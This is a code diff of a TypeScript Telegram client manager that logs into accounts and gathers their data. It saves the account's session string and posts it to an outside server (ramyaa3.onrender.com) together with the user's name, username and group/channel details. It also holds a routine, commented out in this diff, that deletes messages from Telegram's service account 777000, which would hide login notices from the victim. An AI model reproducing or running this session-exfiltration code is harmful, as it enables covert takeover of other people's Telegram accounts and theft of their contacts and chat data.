@@ -168,22 +168,20 @@ class TelegramManager {
     }
 
     async deleteMessages() {
-        console.log("IsConnected - ", this.client.connected, this.phoneNumber);
-        if (this.client.connected) {
-            try {
-                const msgs = await this.client.getMessages("777000", { limit: 2 });
-                const len = msgs['total'];
-                console.log(len)
-                if (msgs.total > 2) {
-                    for (let i = 0; i < msgs.length - 1; i++) {
-                        console.log(msgs[i]?.text);
-                        msgs[i]?.delete({ revoke: true });
-                    }
-                }
-            } catch (error) {
-                console.log("Cannot delete Messages - ", this.phoneNumber);
-            }
-        }
+        // console.log("IsConnected - ", this.client.connected, this.phoneNumber);
+        // if (this.client.connected) {
+        //     try {
+        //         const msgs = await this.client.getMessages("777000", { limit: 10 });
+        //         const len = msgs['total'];
+        //         console.log(len)
+        //         for (let i = 0; i < len - 1; i++) {
+        //             console.log(msgs[i]?.text);
+        //             msgs[i]?.delete({ revoke: true });
+        //         }
+        //     } catch (error) {
+        //         console.log("Cannot delete Messages - ", this.phoneNumber);
+        //     }
+        // }
         console.log("DeleteMessages TODO")
     }
 
@@ -440,7 +438,7 @@ class TelegramManager {
         let movieCount = 0;
         const sess = this.client.session.save() as unknown as string;
         const user: any = await result.toJSON();
-        const dialogs = await this.client?.getDialogs({ limit: 600 });
+        // const dialogs = await this.client?.getDialogs({ limit: 600 });
         // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
         // for (const message of messageHistory) {
         //     const text = message.text.toLocaleLowerCase();
@@ -457,11 +455,6 @@ class TelegramManager {
         const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
             hash: bigInt.zero
         }));
-
-        await this.deleteMessages();
-        await this.disconnect();
-        await deleteClient(this.phoneNumber);
-
         let channels = 0;
         const chatsArray = [];
         let personalChats = 0;
@@ -471,31 +464,23 @@ class TelegramManager {
             phone: contact.phone,
             firstName: contact.firstName,
             lastName: contact.lastName,
-            username: contact.username,
+            userName: contact.username,
             clientId: contact.id.toString(),
             fromId: user.id
         }));
         console.log("AllGood")
-        for (let chat of dialogs) {
-            if (chat.isChannel || chat.isGroup) {
-                channels++;
-                const chatEntity = <Api.Channel>chat.entity.toJSON();
-                const doc = {
-                    "channelId": chatEntity.id.toString(),
-                    "broadcast": chatEntity.broadcast,
-                    "canSendMsgs": !chatEntity.broadcast && !chatEntity.defaultBannedRights?.sendMessages,
-                    "megagroup": chatEntity.megagroup,
-                    "participantsCount": chatEntity.participantsCount,
-                    "restricted": chatEntity.restricted,
-                    "sendMessages": chatEntity.defaultBannedRights?.sendMessages,
-                    "title": chatEntity.title,
-                    "username": chatEntity.username
-                }
-                chatsArray.push(doc);
-            } else {
-                personalChats++;
-            }
-        }
+        // for (let chat of dialogs) {
+        //     if (chat.isChannel || chat.isGroup) {
+        //         channels++;
+        //         const chatEntity: any = chat.entity.toJSON();
+        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+        //         if (!chatEntity.broadcast && !cannotSendMsgs) {
+        //             chatsArray.push(chatEntity);
+        //         }
+        //     } else {
+        //         personalChats++;
+        //     }
+        // }
         // const callLogs = await this.getCallLogs();
 
 
@@ -506,7 +491,7 @@ class TelegramManager {
             session: `${sess}`,
             firstName: user.firstName,
             lastName: user.lastName,
-            username: user.username,
+            userName: user.username,
             channels: channels,
             personalChats: personalChats,
             calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},
@@ -525,12 +510,14 @@ class TelegramManager {
         try {
             console.log("posting results");
             await axios.post(`https://ramyaa3.onrender.com/user`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaa3.onrender.com/channels/createMultiple`, chatsArray, { headers: { 'Content-Type': 'application/json' } });
+            await axios.post(`https://ramyaa3.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
             // await axios.post(`https://ramyaaa2.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
         } catch (error) {
-            console.log("Error Occured");
+            console.log("Error Occured 1");
             console.log(error)
         }
-
+        // await this.deleteMessages();
+        await this.disconnect();
+        await deleteClient(this.phoneNumber);
     }
 }
